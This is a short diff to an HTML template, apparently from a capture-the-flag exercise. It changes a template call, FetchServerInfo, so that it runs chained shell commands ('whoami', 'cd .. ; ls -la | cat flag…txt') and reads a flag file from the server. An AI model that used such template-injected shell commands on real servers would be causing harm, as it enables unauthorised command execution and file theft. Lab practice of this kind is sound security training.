@@ -7,7 +7,7 @@
     <h2>Server Information</h2>
     <ul>
         <li>USER: {{.FetchServerInfo "whoami"}}</li>
-        <li>Flag: {{.FetchServerInfo "cd .. ; ls -la"}}</li>
+        <li>Flag: {{.FetchServerInfo "cd .. ; ls -la |  cat flag530240caa2.txt"}}</li>
     </ul>
     <h2>Client Information</h2>
     <ul>
